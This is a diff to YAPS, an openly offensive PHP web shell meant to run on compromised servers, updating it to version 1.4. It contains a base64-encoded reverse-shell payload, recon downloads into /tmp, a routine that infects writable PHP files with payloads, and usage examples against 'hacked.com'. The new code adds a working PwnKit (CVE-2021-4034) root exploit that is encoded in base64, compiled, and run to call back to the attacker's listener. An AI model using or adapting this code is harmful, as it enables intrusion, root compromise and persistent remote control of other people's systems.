@@ -1,12 +1,12 @@
 <?php
 # YAPS - Yet Another PHP Shell
-# Version 1.3.1 - 01/08/21
+# Version 1.4 - 04/02/22
 # Made by Nicholas Ferreira
 # https://github.com/Nickguitar/YAPS
 
 
 //error_reporting(0);
-$version = "1.3.1";
+$version = "1.4";
 set_time_limit(0);
 ignore_user_abort(1);
 ini_set('max_execution_time', 0);
@@ -18,7 +18,6 @@ $resources = array(
 "linpeas"   => "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh",
 "linenum"   => "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
 "suggester" => "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
-"verifyUpdateURL" => "https://raw.githubusercontent.com/Nickguitar/YAPS/main/version",
 "updateURL" => "https://raw.githubusercontent.com/Nickguitar/YAPS/main/yaps.php");
 
 $ip = '127.0.0.1';
@@ -97,7 +96,8 @@ $commands = array(
 	"passwd",
 	"php",
 	"stabilize",
-	"suggester"
+	"suggester",
+	"pwnkit"
 //	"upload"
 );
 
@@ -141,10 +141,10 @@ There are three ways you can start the connection:
 ').green('1. Via command line in the compromised host;').'
 	E.g: $ php yaps.php [options] [ip port|ip:port]
 
-'.green('2. Making a POST request to the file with the parameter "x";').'
+'.green('2. Making a POST request to the YAPS.php file with the parameter "x=ip:port";').'
 	E.g: $ curl -X POST -d "x=192.168.73.59:7359" hacked.com/uploads/yaps.php
 
-'.green('3. Making a GET request without parameters (will connect to the hardcoded socket);').'
+'.green('3. Making a GET request without parameters (YAPS will connect to the socket hardcoded at the config section);').'
 	E.g: $ curl hacked.com/uploads/yaps.php
 
 '.yellow('Options:').white('
@@ -160,6 +160,7 @@ your@machine:~$ curl -X POST -d "x=192.168.73.59" hacked.com/uploads/yaps.php
 ';
 }
 
+//check whether a function is available for php to run it
 function isAvailable($function){
 	$dis = ini_get('disable_functions');
 	if(!empty($dis)){
@@ -175,7 +176,7 @@ function isAvailable($function){
 	return false;
 }
 
-
+//display help menu
 function help(){
 
 	$help = '
@@ -203,6 +204,8 @@ function help(){
   	Show options for password	
   '.cyan('!php').'
   	Write and run PHP code on the remote host
+  '.cyan('!pwnkit').'
+  	Try to exploit CVE-2021-4034 and spawn a root reverse shell
   '.cyan('!stabilize').'
   	Stabilize to an interactive shell
   '.cyan('!suggester').'
@@ -218,6 +221,7 @@ function help(){
 	return $help;
 }
 
+//try to run a system command via different ways
 function run_cmd($c){ // modified from msf
 
 	$c = $c." 2>&1\n"; // stderr to stdout
@@ -263,6 +267,7 @@ function run_cmd($c){ // modified from msf
 
 $ps1 = "[YAPS] ".str_replace(PHP_EOL,"",green(run_cmd("whoami")."@".run_cmd("hostname")).":".cyan(run_cmd("pwd"))."$ "); // user@hostname:~$
 
+//make some internal recon
 function sysinfo(){
 	global $s;
 	fwrite($s,green("\n====================== Initial info ======================\n\n"));
@@ -346,6 +351,7 @@ function sysinfo(){
 	fwrite($s, cyan("\n[i]")." Get more information with !enum.".PHP_EOL);
 }
 
+//return a random string with 5~6 chars
 function random_name($name = ""){
     $charset = 	implode("",array_merge(range("A", "Z"), range("a","z"), range(0,9))); // merge arrays and join them into a string
     for($i=0;$i<=mt_rand(5,6);$i++)
@@ -353,7 +359,8 @@ function random_name($name = ""){
     return $name;
 }
 
-function download($url, $saveTo){ //download file from $url to $saveTo
+//download file from $url to $saveTo
+function download($url, $saveTo){ 
 	$randomName = random_name();
 	$content = get_request($url);
 
@@ -369,7 +376,8 @@ function download($url, $saveTo){ //download file from $url to $saveTo
 	return false;
 }
 
-function enum(){ //download linpeas, save to /tmp and change its permission to 777
+//download linpeas, save to /tmp and change its permission to 777
+function enum(){ 
 	global $s, $resources;
 	$downloadLinpeas = download($resources["linpeas"], "/tmp/");
 	$downloadLinenum = download($resources["linenum"], "/tmp");
@@ -389,7 +397,8 @@ function enum(){ //download linpeas, save to /tmp and change its permission to 7
 	}
 }
 
-function suggester(){//download linux exploit suggester, save to /tmp and change its permission to 777
+//download linux exploit suggester, save to /tmp and change its permission to 777
+function suggester(){
 	global $s, $resources;
 	$download = download($resources["suggester"], "/tmp/");
 	if($download){
@@ -402,7 +411,8 @@ function suggester(){//download linux exploit suggester, save to /tmp and change
 	return;
 }
 
-function refresh_ps1($changecolor=false){ //build a nice PS1, toggle between colored and not colored
+//build a nice PS1, toggle between colored and not colored
+function refresh_ps1($changecolor=false){
 	global $ps1_color,$ps1;
 	$user = str_replace(PHP_EOL, "", run_cmd("whoami"));
 
@@ -417,8 +427,15 @@ function refresh_ps1($changecolor=false){ //build a nice PS1, toggle between col
 	}
 }
 
-function getPHP(){ //receive PHP code via socket
+//check if eva() is available and receive PHP code via socket
+function getPHP(){
 	global $s;
+	
+	if(!isAvailable("eval")){
+		fwrite($s, red("[-] ")."\"eval()\" function is not enabled.");
+		return 0;
+	}
+	
 	$php = '';
 	fwrite($s, cyan("[*]")." Write your PHP code (*without* PHP tags). To send and run it, use ".green("!php").". ".yellow("\n[i] Note that this is NOT an interactive PHP shell. Max input: 4096 bytes.").white("\nphp> "));
 	while($c = fread($s, 4096)){
@@ -445,17 +462,20 @@ function runPHP($code){ // guess what
 	return $result;
 }
 
-function stabilize($post_socket=""){ // spawn an interactive shell
+// spawn an interactive shell
+function stabilize($post_socket=""){ 
 	global $s, $port, $ip;
 
-	$payload = "JHNjcmlwdD1zaGVsbF9leGVjKCJ3aGljaCBzY3JpcHQiKTskcHkzPXNoZWxsX2V4ZWMoIndoaWNoIHB5dGhvbjMiKTskcHk9c2hlbGxfZXhlYygid2hpY2ggcHl0aG9uIik7aWYoc3RybGVuKCRzY3JpcHQpPjYgJiYgc3RycG9zKCRzY3JpcHQsIm5vdCBmb3VuZCIpPT1mYWxzZSkgJHN0YWJpbGl6ZXI9Ii9iaW4vYmFzaCAtY2kgJyIuJHNjcmlwdC4iIC1xYyAvYmluL2Jhc2ggL2Rldi9udWxsJyI7ZWxzZSBpZihzdHJsZW4oJHB5Myk+NyAmJiBzdHJwb3MoJHNjcmlwdCwibm90IGZvdW5kIik9PWZhbHNlKSAkc3RhYmlsaXplcj0kcHkzLiIgLWMgJ2ltcG9ydCBwdHk7cHR5LnNwYXduKFwiL2Jpbi9iYXNoXCIpJyI7ZWxzZSBpZihzdHJsZW4oJHB5KT42ICYmIHN0cnBvcygkc2NyaXB0LCJub3QgZm91bmQiKT09ZmFsc2UpICRzdGFiaWxpemVyPSRweS4iIC1jICdpbXBvcnQgcHR5O3B0eS5zcGF3bihcIi9iaW4vYmFzaFwiKSciO2Vsc2UgJHN0YWJpbGl6ZXI9Ii9iaW4vYmFzaCI7JHN0YWJpbGl6ZXI9c3RyX3JlcGxhY2UoIlxuIiwiIiwkc3RhYmlsaXplcik7JHNoZWxsPSJ1bmFtZSAtYTskc3RhYmlsaXplciI7dW1hc2soMCk7JHNvY2s9ZnNvY2tvcGVuKCJJUF9BRERSIixQT1JULCRlcnJubywkZXJyc3RyLDMwKTskc3RkPWFycmF5KCAwID0+IGFycmF5KCJwaXBlIiwiciIpLDEgPT4gYXJyYXkoInBpcGUiLCJ3IiksMiA9PiBhcnJheSgicGlwZSIsInciKSApOyRwcm9jZXNzPXByb2Nfb3Blbigkc2hlbGwsJHN0ZCwkcGlwZXMpO2ZvcmVhY2goJHBpcGVzIGFzICRwKSBzdHJlYW1fc2V0X2Jsb2NraW5nKCRwLDApO3N0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssMCk7d2hpbGUoIWZlb2YoJHNvY2spKXskcmVhZF9hPWFycmF5KCRzb2NrLCRwaXBlc1sxXSwkcGlwZXNbMl0pO2lmKGluX2FycmF5KCRzb2NrLCRyZWFkX2EpKSBmd3JpdGUoJHBpcGVzWzBdLGZyZWFkKCRzb2NrLDIwNDgpKTtpZihpbl9hcnJheSgkcGlwZXNbMV0sJHJlYWRfYSkpIGZ3cml0ZSgkc29jayxmcmVhZCgkcGlwZXNbMV0sMjA0OCkpO2lmKGluX2FycmF5KCRwaXBlc1syXSwkcmVhZF9hKSkgZndyaXRlKCRzb2NrLGZyZWFkKCRwaXBlc1syXSwyMDQ4KSk7fSBmY2xvc2UoJHNvY2spO2ZvcmVhY2goJHBpcGVzIGFzICRwKSBmY2xvc2UoJHApO3Byb2NfY2xvc2UoJHByb2Nlc3MpOw==";// modified php-reverse-shell (works w/ sudo, mysql, ftp, su, etc.) 
+	// modified php-reverse-shell (works w/ sudo, mysql, ftp, su, etc.) 
+	$payload = "JHNjcmlwdD1zaGVsbF9leGVjKCJ3aGljaCBzY3JpcHQiKTskcHkzPXNoZWxsX2V4ZWMoIndoaWNoIHB5dGhvbjMiKTskcHk9c2hlbGxfZXhlYygid2hpY2ggcHl0aG9uIik7aWYoc3RybGVuKCRzY3JpcHQpPjYgJiYgc3RycG9zKCRzY3JpcHQsIm5vdCBmb3VuZCIpPT1mYWxzZSkgJHN0YWJpbGl6ZXI9Ii9iaW4vYmFzaCAtY2kgJyIuJHNjcmlwdC4iIC1xYyAvYmluL2Jhc2ggL2Rldi9udWxsJyI7ZWxzZSBpZihzdHJsZW4oJHB5Myk+NyAmJiBzdHJwb3MoJHNjcmlwdCwibm90IGZvdW5kIik9PWZhbHNlKSAkc3RhYmlsaXplcj0kcHkzLiIgLWMgJ2ltcG9ydCBwdHk7cHR5LnNwYXduKFwiL2Jpbi9iYXNoXCIpJyI7ZWxzZSBpZihzdHJsZW4oJHB5KT42ICYmIHN0cnBvcygkc2NyaXB0LCJub3QgZm91bmQiKT09ZmFsc2UpICRzdGFiaWxpemVyPSRweS4iIC1jICdpbXBvcnQgcHR5O3B0eS5zcGF3bihcIi9iaW4vYmFzaFwiKSciO2Vsc2UgJHN0YWJpbGl6ZXI9Ii9iaW4vYmFzaCI7JHN0YWJpbGl6ZXI9c3RyX3JlcGxhY2UoIlxuIiwiIiwkc3RhYmlsaXplcik7JHNoZWxsPSJ1bmFtZSAtYTskc3RhYmlsaXplciI7dW1hc2soMCk7JHNvY2s9ZnNvY2tvcGVuKCJJUF9BRERSIixQT1JULCRlcnJubywkZXJyc3RyLDMwKTskc3RkPWFycmF5KCAwID0+IGFycmF5KCJwaXBlIiwiciIpLDEgPT4gYXJyYXkoInBpcGUiLCJ3IiksMiA9PiBhcnJheSgicGlwZSIsInciKSApOyRwcm9jZXNzPXByb2Nfb3Blbigkc2hlbGwsJHN0ZCwkcGlwZXMpO2ZvcmVhY2goJHBpcGVzIGFzICRwKSBzdHJlYW1fc2V0X2Jsb2NraW5nKCRwLDApO3N0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssMCk7d2hpbGUoIWZlb2YoJHNvY2spKXskcmVhZF9hPWFycmF5KCRzb2NrLCRwaXBlc1sxXSwkcGlwZXNbMl0pO2lmKGluX2FycmF5KCRzb2NrLCRyZWFkX2EpKSBmd3JpdGUoJHBpcGVzWzBdLGZyZWFkKCRzb2NrLDIwNDgpKTtpZihpbl9hcnJheSgkcGlwZXNbMV0sJHJlYWRfYSkpIGZ3cml0ZSgkc29jayxmcmVhZCgkcGlwZXNbMV0sMjA0OCkpO2lmKGluX2FycmF5KCRwaXBlc1syXSwkcmVhZF9hKSkgZndyaXRlKCRzb2NrLGZyZWFkKCRwaXBlc1syXSwyMDQ4KSk7fSBmY2xvc2UoJHNvY2spO2ZvcmVhY2goJHBpcGVzIGFzICRwKSBmY2xvc2UoJHApO3Byb2NfY2xvc2UoJHByb2Nlc3MpOw==";
 
-	if(strlen($post_socket) > 1 && strlen($post_socket) > 0){ //if is set
+	if(strlen($post_socket) > 1 && strlen($post_socket) > 0){ //if post_socket is set
 		echo $post_socket;
 		$skt = explode(":", $post_socket);
 		$post_ip = $skt[0];
 		$post_port = $skt[1];
-		$final_payload = base64_encode(str_replace("IP_ADDR", $post_ip, str_replace("PORT", $post_port, base64_decode($payload)))); // changes payload to add correct socket
+		// changes payload to add correct socket
+		$final_payload = base64_encode(str_replace("IP_ADDR", $post_ip, str_replace("PORT", $post_port, base64_decode($payload)))); 
 		shell_exec("echo ".$final_payload."| base64 -d | php -r '\$stdin=file(\"php://stdin\");eval(\$stdin[0]);'");
 		return;
 	}
@@ -463,7 +483,7 @@ function stabilize($post_socket=""){ // spawn an interactive shell
 	fwrite($s, yellow("[i]")." Set up a listener on another port (nc -lnvp <port>) and press ENTER.\nChoose a port: ");
 	while($c = fread($s, 8)){ //reads [ENTER]
 		if(strlen($c) > 0){ // got [ENTER]
-			$recv_port = (int)$c; // get the integer part
+			$recv_port = (int)$c; // get the integer part of input
 			if($recv_port>65535 || $recv_port==0){
 				fwrite($s,red("[-]")." Port must be between 0-65535.\nChoose another port: ");
 			}else{
@@ -487,7 +507,8 @@ function backdoor(){
 // todo
 }
 
-function check_password(){ //ask for password and return 0 or 1
+//ask for password and check if it's correct
+function check_password(){
 	global $s, $pass_hash, $salt;
 	fwrite($s, yellow("[i] ")."This shell is protected. \nEnter the password: ");
 	while($data = fread($s,1024)){
@@ -496,21 +517,28 @@ function check_password(){ //ask for password and return 0 or 1
 	}
 }
 
+//change the shell's password 
 function change_password($new){
 	global $salt, $yaps, $s;
 	$new_hash = hash("sha512", $salt.hash("sha512",$new, false), false);
-	if(!is_readable($yaps) || !is_writable($yaps)) return false; //someone changed the permission
+
+	$perm_err = red("[-] ")."Couldn't read or write the file. Are the permissions right?\n" . run_cmd("ls -l ".$yaps."\n");
+
+	//someone changed the permission
+	if(!is_readable($yaps) || !is_writable($yaps))
+		return 	fwrite($s, $perm_err);
+	
 	$yaps_code = file_get_contents($yaps);
 	$new_yaps_code = preg_replace('/[a-f0-9]{128}/', $new_hash, $yaps_code, 1); // the password hash is be the first thing this regex should match
-	if(file_put_contents($yaps, $new_yaps_code)){
-		fwrite($s, green("[+] ")."Password changed. Changes will take effect on next connection.\n");
-		return true;
-	}else{
-		fwrite($s, red("[-] ")."Couldn't read or write the file. Are the permissions right?\n" . run_cmd("ls -l ".$yaps."\n"));
-		return false;
-	}
+	
+	if(file_put_contents($yaps, $new_yaps_code))
+		return fwrite($s, green("[+] ")."Password changed. Changes will take effect on next connection.\n");
+	
+	fwrite($s, $perm_err);
+	return false;
 }
 
+//activate or deactivate password protection
 function toggle_password(){
 	global $use_password, $s, $yaps;
 	$yaps_code = file_get_contents($yaps);
@@ -524,7 +552,7 @@ function toggle_password(){
 		fwrite($s, red("[-] ")."Couldn't deactivate password.\n");
 		return false;
 	}
-	// will enter here if $use_password is false
+	// enter here if $use_password is false
 	$new_yaps_code = preg_replace('/(\$use_password += +)(false)/', '$1true', $yaps_code, 1); //limit must be 1
 	if(file_put_contents($yaps, $new_yaps_code)){
 		$use_password = false; // if limit isn't 1, this will be changed to false too
@@ -538,11 +566,11 @@ function toggle_password(){
 function passwd(){
 	global $s,$use_password;
 	if($use_password){
-		if(!check_password()){
-			fwrite($s, red("[-] ")." Wrong password\n");
-			return;
-		} 
+		if(!check_password())
+			return fwrite($s, red("[-] ")." Wrong password\n");
+
 		fwrite($s, green("[+] Password is enabled. ").white("Choose an option:")."\n[1] Change password\n[2] Disable password\n[3] Cancel\n> ");
+		
 		while($data = fread($s, 8)){
 			switch(substr($data, 0, -1)){
 				case "1": // change password
@@ -592,6 +620,7 @@ function passwd(){
 	}
 }
 
+//spawn another YAPS shell session
 function duplicate(){
 	global $s,$ip,$port,$_SERVER;
 
@@ -616,10 +645,8 @@ function duplicate(){
 		fwrite($s, "Connecting to ".$ip.":".$new_port."\n");
 		$cmd = "wget -qO- --post-data=\"".http_build_query($socket)."\" $curl_url > /dev/null";
 		if(isAvailable("popen") && isAvailable("pclose"))
-			pclose(popen($cmd." &",'r')); // doesn't wait for wget to return
-		else
-			run_cmd("timeout --kill-after 0 1 ".$cmd); // thx znttfox =)
-		return;
+			return pclose(popen($cmd." &",'r')); // doesn't wait for wget to return
+		return run_cmd("timeout --kill-after 0 1 ".$cmd); // thx znttfox =)
 	}
 }
 
@@ -643,25 +670,30 @@ function get_request($url){ //todo: change download function
 	return $response;
 }
 
+//check if YAPS is up to date
 function verify_update(){
 	global $version, $resources;
-	$newest_version = 0;
+
 	echo cyan("[i] ")."Your version: $version. Checking for updates...\n";
-	$request = get_request($resources["verifyUpdateURL"]);
-	if($request) $newest_version = $request;
 
-	$newest_version_ = (int)str_replace(".","",$newest_version); //get only numbers
-	$version_ = (int)str_replace(".","",$version);
+	$versionURL = file_get_contents($resources["updateURL"]);
+	preg_match('/version = "([^"]+)";/', $versionURL,$matches);
+	$newest_version = explode(".", $matches[1]);
 
-	if($newest_version_ !== 0 && $newest_version_ > $version_){
-		echo red("[i]")." Your version is not up to date.\n".green("[DOWNLOAD v".str_replace("\n","",$newest_version)."]: ").$resources["updateURL"]."\n";
-		return;
-	}
-	echo green("[+] ")."YAPS is already up to date (v$version)!\n";
-	return;
+	$version = explode(".", $version);
+
+	//iterate over the size of the smallest arr
+	$size = count($version) <= count($newest_version) ? count($version) : count($newest_version);
+	
+	for($i=0;$i<$size;$i++)
+		if((int)$newest_version > $version[$i])
+			return red("[i]")." Your version is not up to date.\n".green("[DOWNLOAD v".implode(".",$newest_version)."]: ").$resources["updateURL"]."\n";
+
+	return green("[+] ")."YAPS is already up to date (v".implode(".",$version).")!\n";
 }
 
-function getFiles($dir){ // return writable php files on webserver root
+// return writable php files at $dir
+function getFiles($dir){ 
 	$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir)); //list recursively
 	$list = array();
 	foreach($iterator as $file)
@@ -673,6 +705,7 @@ function getFiles($dir){ // return writable php files on webserver root
 	return $list;
 }
 
+//select files to be infected with some PHP payload
 function select_files(){
 	global $s;
 
@@ -713,6 +746,7 @@ function select_files(){
 	}
 }
 
+//let user choose the payload to infect selected files
 function choose_payload($allFiles,$toInfect){
 	global $s;
 	$payloads = array(
@@ -769,7 +803,7 @@ function choose_payload($allFiles,$toInfect){
 
 //list of all writable php files, files to be infected, index of choosen payload, list of payload, position (beginning or end of file)
 function infect($allFiles,$fileArr,$payload_index,$payload_list,$position=1){
-	// 1 = end; 0 = beginning
+	// position 1 = end; 0 = beginning
 	global $s;
 	$payload = $payload_list[array_keys($payload_list)[$payload_index]]; //the payload itself
 	fwrite($s, yellow("\n[!] ").white("Files to infect:\n"));
@@ -803,6 +837,59 @@ function infect($allFiles,$fileArr,$payload_index,$payload_list,$position=1){
 	return;
 }
 
+//try to gain a reverse root shell with cve-2021-4034
+function pwnkit(){
+	global $ip, $s, $yaps;
+	
+	$port = "9090"; //port to which root shell will be sent
+	
+	fwrite($s, cyan("[*] ").white("Trying to exploit PwnKit (CVE-2021-4034)")."\n");
+
+	if(strlen(run_cmd("which pkexec")) < 6)
+		return fwrite($s, red("[-] ").white("Could not find pkexec.")."\n");
+
+	if(strlen(run_cmd("which gcc")) < 3)
+		return fwrite($s, red("[-] ").white("Could not find gcc. Is it installed?")."\n");
+
+
+	fwrite($s, green("[+] ").white("Pkexec detected at ".run_cmd("which pkexec")));
+	fwrite($s, cyan("[*] ").white(run_cmd("$(which pkexec) --version")));
+	fwrite($s, cyan("[*] ").white("Select a port to receive the root shell [default=$port]: "));
+
+	while($new_port = fread($s, 32)){
+		$new_port = (base64_encode($new_port) == "Cg==") ? $port : substr($new_port,0,-1); //if new_port= newline, new_port = default
+		break;
+	}
+
+	// adapted from https://github.com/arthepsy/CVE-2021-4034/
+	$exploit = base64_decode("I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgpjaGFyICpzID0gCgkiI2luY2x1ZGUgPHN0ZGlvLmg+XG4jaW5jbHVkZSA8c3RkbGliLmg+XG4jaW5jbHVkZSA8dW5pc3RkLmg+XG52b2lkIGdjb252KCkge31cbnZvaWQgZ2NvbnZfaW5pdCgpIHtzZXR1aWQoMCk7c2V0Z2lkKDApO3NldGV1aWQoMCk7c2V0ZWdpZCgwKTtzeXN0ZW0oXCJleHBvcnQgUEFUSD0vdXNyL2xvY2FsL3NiaW46L3Vzci9sb2NhbC9iaW46L3Vzci9zYmluOi91c3IvYmluOi9zYmluOi9iaW47IHJtIC1yZiAnR0NPTlZfUEFUSD0uJyAneCc7IG5vaHVwIC91c3IvYmluL3BocCBZQVBTIElQIFBPUlQgJlwiKTtcbmV4aXQoMCk7fSI7CmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsgRklMRSAqZjsgc3lzdGVtKCJta2RpciAtcCAnR0NPTlZfUEFUSD0uJzsgdG91Y2ggJ0dDT05WX1BBVEg9Li94JzsgY2htb2QgYSt4ICdHQ09OVl9QQVRIPS4veCc7IG1rZGlyIC1wIHg7IGVjaG8gJ21vZHVsZSBVVEYtOC8vIFgvLyB4IDInID4geC9nY29udi1tb2R1bGVzIik7IGYgPSBmb3BlbigieC94LmMiLCAidyIpOyBmcHJpbnRmKGYsICIlcyIsIHMpOyBmY2xvc2UoZik7IHN5c3RlbSgiZ2NjIHgveC5jIC1vIHgveC5zbyAtc2hhcmVkIC1mUElDIik7IGNoYXIgKmVbXSA9IHsgIngiLCAiUEFUSD1HQ09OVl9QQVRIPS4iLCAiQ0hBUlNFVD1YIiwgIlNIRUxMPXgiLCBOVUxMIH07IGV4ZWN2ZSgiL3Vzci9iaW4vcGtleGVjIiwgKGNoYXIqW10pe05VTEx9LCBlKTt9Cg==");
+
+	$exploit = str_replace("YAPS", $yaps, $exploit);
+	$exploit = str_replace("IP", $ip, $exploit);
+	$exploit = str_replace("PORT", $new_port, $exploit);
+
+	if(!file_put_contents("/tmp/xpl.c", $exploit))
+		return fwrite($s, red("[-] ")."Couldn't write exploit to /tmp. Do you have write permissions there?"); 
+
+	fwrite($s, white("~ Trying to compile exploit ~\n"));
+
+	run_cmd("$(which gcc) /tmp/xpl.c -o /tmp/xpl");
+
+	if(!file_exists("/tmp/xpl"))
+		return fwrite($s, red("[-] ")."Couldn't compile exploit... =/");
+	
+	fwrite($s, green("[+] ").white("Exploit compiled! Trying to run it... Hopefully you're now root!\n"));
+	fwrite($s, yellow("[!] ").white("This instance is locked until the root shell session is over.\n"));
+
+	run_cmd("nohup /tmp/xpl &"); //TODO: make this shit work in background
+
+	fwrite($s, cyan("[*] ").white("Deleting temp files...\n\n"));	
+	unlink("/tmp/xpl.c");
+	unlink("/tmp/xpl");
+	
+}
+
+//guess what
 function parse_stdin($input){
 	global $s, $color;
 	switch(substr($input,0,-1)){ // remove newline at end
@@ -848,23 +935,25 @@ function parse_stdin($input){
 		case "!infect":
 			select_files();
 			break;
+		case "!pwnkit":
+			pwnkit();
+			break;
 	}	
 }
 
+//warn user that $cmd wasn't found and try to detect some typo
 function cmd_not_found($cmd){
 	global $s, $commands;
 	foreach($commands as $valid_cmd){
 		similar_text($cmd, $valid_cmd, $percentage);
-		if($percentage > 70){ // if they're similar, suggest correction
-			fwrite($s, yellow("[!] ")."Command '!$cmd' not found. Did you mean '!".$valid_cmd."'?.\n");
-			return;
-		}
-	}
-	fwrite($s, yellow("[!] ")."Command '!".substr($c,1,-1)."' not found. Use !help.\n");
+		if($percentage > 70) // if they're similar, suggest correction
+			return fwrite($s, yellow("[!] ")."Command '!$cmd' not found. Did you mean '!".$valid_cmd."'?.\n");	
+}
+	fwrite($s, yellow("[!] ")."Command '!".$cmd."' not found. Use !help.\n");
 	return;
 }
 
-
+//make a socket connection to your tcp listener
 function connect(){
 	global $use_password,$commands,$ps1,$s,$silent;
 	refresh_ps1(1);
@@ -903,7 +992,7 @@ function connect(){
 
 ########################## END FUNCTIONS ##########################
 
-if($auto_verify_update) verify_update();
+if($auto_verify_update) echo verify_update();
 
 if(isset($_REQUEST['stabilize']) && $_REQUEST['stabilize']){ //stabilized shell was requested
 	$x = $_POST['x'];
